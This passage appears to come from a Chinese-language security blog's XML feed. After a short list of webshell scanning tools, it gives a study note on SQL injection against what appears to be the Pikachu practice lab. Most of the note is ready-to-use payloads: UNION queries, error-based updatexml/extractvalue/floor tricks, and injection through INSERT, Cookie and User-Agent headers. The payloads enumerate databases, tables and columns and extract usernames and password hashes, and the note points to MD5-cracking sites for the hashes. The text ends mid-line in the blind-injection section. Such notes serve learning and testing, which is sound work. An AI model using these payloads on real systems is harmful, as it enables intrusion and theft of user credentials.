alt="img"></p><p>下载地址：</p><p>（Windows平台）<a href="https://edr.sangfor.com.cn/tool/WebShellKillerTool.zip">https://edr.sangfor.com.cn/tool/WebShellKillerTool.zip</a></p><p>（Linux平台）<a href="http://edr.sangfor.com.cn/api/download/WebShellKillerForLinux.tar.gz">http://edr.sangfor.com.cn/api/download/WebShellKillerForLinux.tar.gz</a></p><p><strong>WEBDIR+</strong></p><p>在线WebShell扫描器：</p><p><img src="http://secimg.sangfor.com.cn/FpezLxIZKDZ-oM_mghzAUJ8yfAAf" alt="img"></p><p>链接地址：<a href="https://scanner.baidu.com/#/pages/intro">https://scanner.baidu.com/#/pages/intro</a></p><p><strong>WebShell Detector</strong></p><p>在线WebShell扫描器：</p><p><img src="http://secimg.sangfor.com.cn/Ficsu5VHFd-qZQCRIi5OhO6JA1c3" alt="img"></p><p>链接地址：<a href="http://www.shelldetector.com/">http://www.shelldetector.com</a></p><p><strong>WEBSHELL.PUB</strong></p><p>在线WebShell扫描器：</p><p><img src="http://secimg.sangfor.com.cn/Fo3MdSOoAB4VZvv3H5l9c88RuIBn" alt="img"></p><p>下载链接：<a href="http://www.shellpub.com/">http://www.shellpub.com</a></p><p>注：转载自-深信服安全实验室<a href="https://wiki.sec.sangfor.com.cn/wiki-safe-event/ZjdlZjcxZDgtZTI4Yy0xMWU5LWJmMWMtZmVmY2ZlMzMwNGM0/1/?category=B007_C0003">原文地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 安全 </tag>
            
            <tag> 工具 </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="2020/12/05/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"/>
      <url>2020/12/05/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 or 1=1</span><br><span class="line">1 or 1=1 <span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码：$query=&quot;<span class="keyword">select</span> <span class="keyword">id</span>,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> username=<span class="string">&#x27;$name&#x27;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">kobe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">方式1、kobe&#x27; or 1=1#</span></span><br><span class="line"><span class="string">select id,email from member where username=&#x27;kobe&#x27; or 1=1#&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">方式2、kobe&#x27; or 1=1 -- 1 </span></span><br><span class="line"><span class="string">select id,email from member where usernam=‘kobe&#x27; or 1=1 -- 1 </span></span><br></pre></td></tr></table></figure><h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">源码：<span class="keyword">select</span> username,<span class="keyword">id</span>,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%$name%&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">方式<span class="number">1</span>、ko%<span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string">select username,id,email from member where username like &#x27;</span>%ko%<span class="string">&#x27; or 1=1#%&#x27;</span></span><br><span class="line"></span><br><span class="line">方式<span class="number">2</span>、ko%<span class="string">&#x27; or 1=1 -- 1</span></span><br><span class="line"><span class="string">select username,id,email from member where username like &#x27;</span>%ko%<span class="string">&#x27; or 1=1 -- 1%&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">源码：<span class="keyword">select</span> <span class="keyword">id</span>,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> username=(<span class="string">&#x27;$name&#x27;</span>)</span><br><span class="line"></span><br><span class="line">方式<span class="number">1</span>、kobe<span class="string">&#x27;) or 1=1#</span></span><br><span class="line"><span class="string">select id,email from member where username=(&#x27;</span>kobe<span class="string">&#x27;) or 1=1#&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">步骤：</span><br><span class="line">1. 获取当前查询语句中查询的列数</span><br><span class="line">kobe&#x27; union <span class="keyword">select</span> <span class="number">1</span><span class="comment">#</span></span><br><span class="line">kobe<span class="string">&#x27; union select 1,2#</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br><span class="line"><span class="number">2.</span> 获取用户名、数据库名、版本</span><br><span class="line">x<span class="string">&#x27; union select user(),database()#</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">version</span>(),<span class="keyword">database</span>()<span class="comment">#</span></span><br><span class="line"><span class="number">3.</span> 获取当前数据库的所有表名</span><br><span class="line">x<span class="string">&#x27; union select TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4. 获取表的列名获取数据库pk中users表的所有列名</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> TABLE_NAME,COLUMN_NAME <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> 获取表中的内容获取数据库pk中<span class="keyword">users</span>表的所有内容</span><br><span class="line">x<span class="string">&#x27; union select username,password from users#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">加密的值：32位、字符混搭，可能是md5值</span></span><br><span class="line"><span class="string">e10adc3949ba59abbe56e057f20f883e</span></span><br><span class="line"><span class="string">e21adc405....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6.解密</span></span><br><span class="line"><span class="string">https://www.somd5.com/</span></span><br><span class="line"><span class="string">http://www.ttmd5.com/hash.php?type=0</span></span><br></pre></td></tr></table></figure><h2 id="基于函数报错注入"><a href="#基于函数报错注入" class="headerlink" title="基于函数报错注入"></a>基于函数报错注入</h2><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1. 获取基本信息</span><br><span class="line">x&#x27; and updatexml(1,version(),0)<span class="comment">#</span></span><br><span class="line">使用concat防止截断</span><br><span class="line">x&#x27; and updatexml(1,concat(0x7e,version()),0)<span class="comment">#</span></span><br><span class="line">x&#x27; and updatexml(1,concat(0x7e,database()),0)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">2. 获取当前数据库的所有表名</span><br><span class="line">x&#x27; and updatexml(1,concat(0x7e,(<span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">修改<span class="keyword">limit</span>可以获取依次获取所有的表名</span><br><span class="line"><span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 获取表的列名</span><br><span class="line"></span><br><span class="line">x<span class="string">&#x27; and updatexml(1,concat(0x7e,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; and TABLE_NAME=&#x27;</span><span class="keyword">users</span><span class="string">&#x27; limit 0,1)),0)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">修改limit可以获取依次获取所有的列名</span></span><br><span class="line"><span class="string">limit 0,1</span></span><br><span class="line"><span class="string">limit 1,1</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4. 获取表中的内容</span></span><br><span class="line"><span class="string">select username,password from users</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)<span class="comment">#</span></span><br><span class="line">x<span class="string">&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">密码32位没有完整显示，只显示了31位：</span></span><br><span class="line"><span class="string">e10adc3949ba59abbe56e057f20f883</span></span><br><span class="line"><span class="string">可以获取后面10位数据</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">right</span>(<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">10</span>),<span class="number">0</span>)<span class="comment">#</span></span><br><span class="line">f20f883e</span><br><span class="line">合成：e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>​    语法：kobe’ and extractvalue(0,concat(0x7e,version()))#</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1. 获取基本信息</span><br><span class="line">x&#39; and extractvalue(1,version(),0)#</span><br><span class="line">使用concat防止截断</span><br><span class="line">x&#39; and extractvalue(0,concat(0x7e,version()))#</span><br><span class="line">x&#39; and extractvalue(1,concat(0x7e,database()))#</span><br><span class="line"></span><br><span class="line">2. 获取当前数据库的所有表名</span><br><span class="line">x&#39; and extractvalue(1,concat(0x7e,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;&#39;pk&#39; limit 0,1)))#</span><br><span class="line"></span><br><span class="line">修改limit可以获取依次获取所有的表名</span><br><span class="line">limit 0,1</span><br><span class="line">limit 1,1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">3. 获取表的列名</span><br><span class="line"></span><br><span class="line">x&#39; and extractvalue(1,concat(0x7e,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA&#x3D;&#39;pk&#39; and TABLE_NAME&#x3D;&#39;users&#39; limit 0,1)))#</span><br><span class="line"></span><br><span class="line">修改limit可以获取依次获取所有的列名</span><br><span class="line">limit 0,1</span><br><span class="line">limit 1,1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">4. 获取表中的内容</span><br><span class="line">select username,password from users</span><br><span class="line">x&#39; and extractvalue(1,concat(0x7e,(select username from users limit 0,1)))#</span><br><span class="line">x&#39; and extractvalue(1,concat(0x7e,(select password from users limit 0,1)))#</span><br><span class="line"></span><br><span class="line">x&#39; and extractvalue(1,right(concat(0x7e,(select password from users limit 0,1)),10))#</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>向下取整的函数，与rand()结合使用</p><p>rand() 生成随机数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">database</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span>  information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">database</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))                       产生随机序列 <span class="number">011011.</span>..</span><br><span class="line"><span class="keyword">count</span>(*)</span><br><span class="line">                                          //获取记录数量</span><br><span class="line"><span class="keyword">concat</span>(<span class="keyword">database</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x</span><br><span class="line">   //字符串连接，重命名x</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> x</span><br><span class="line">       //分组</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">rand</span>(<span class="number">0</span>) <span class="keyword">from</span> <span class="keyword">users</span>;          // 有几个随机数就是有几条记录</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>) <span class="keyword">from</span> <span class="keyword">users</span>; // 有3条记录，就是这样的序列011,6条就是011011</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.tables;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> x;//有随机函数无法分组</span><br><span class="line"></span><br><span class="line">1. 获取基本信息</span><br><span class="line">kobe&#x27; and (<span class="keyword">select</span> <span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span>  information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) a )<span class="comment">#</span></span><br><span class="line">kobe<span class="string">&#x27; and (select 2 from (select count(*),concat(database(),floor(rand(0)*2))x from  information_schema.tables group by x) a )#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2. 获取当前数据库的所有表名</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span>  information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) a )<span class="comment">#</span></span><br><span class="line">kobe<span class="string">&#x27; and (select 2 from (select count(*),concat((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; limit 1,1),floor(rand(0)*2))x from  information_schema.tables group by x) a )#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3. 获取表的列名</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span>  information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) a )<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> 获取表中的内容</span><br><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"></span><br><span class="line">kobe<span class="string">&#x27; and (select 2 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from  information_schema.tables group by x) a )#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span>  information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) a )<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">e10adc3949ba59abbe56e057f20f883e</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1. 获取基本信息</span><br><span class="line"></span><br><span class="line">使用concat防止截断</span><br><span class="line">kobe&#x27; or updatexml(1,concat(0x7e,version()),0) or &#x27;</span><br><span class="line">kobe&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br><span class="line"></span><br><span class="line">2. 获取当前数据库的所有表名</span><br><span class="line">kobe&#x27; or updatexml(1,concat(0x7e,(<span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">修改limit可以获取依次获取所有的表名</span></span><br><span class="line"><span class="string">limit 0,1</span></span><br><span class="line"><span class="string">limit 1,1</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3. 获取表的列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">修改limit可以获取依次获取所有的列名</span></span><br><span class="line"><span class="string">limit 0,1</span></span><br><span class="line"><span class="string">limit 1,1</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4. 获取表中的内容</span></span><br><span class="line"><span class="string">select username,password from users</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h2 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET /pk/vul/sqli/sqli_header/sqli_header.php HTTP/1.1</span><br><span class="line">Host: 192.168.220.135</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#x27;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.220.135/pk/vul/sqli/sqli_header/sqli_header_login.php</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=i7srppd2qsilpg8lpd46eppb03</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 2</span><br><span class="line"></span><br><span class="line">注入点：</span><br><span class="line">Cookie: ant[uname]=admin&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br><span class="line"></span><br><span class="line">分析方法：</span><br><span class="line">1. 使用自己手头的测试代理，对可能存在注入的点进行测试(黑盒测试)</span><br><span class="line">2. 如果能获取当前网站的源码可以下载源码，本地结合源码进行测试(黑白盒混搭，灰盒测试)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">substr 查找字符串中的子串</span><br><span class="line">ascii  将字符转为ascii码</span><br><span class="line">right  获取字符串的右边子串</span><br><span class="line">left   获取字符串的左边子串</span><br><span class="line">length 求长度</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span 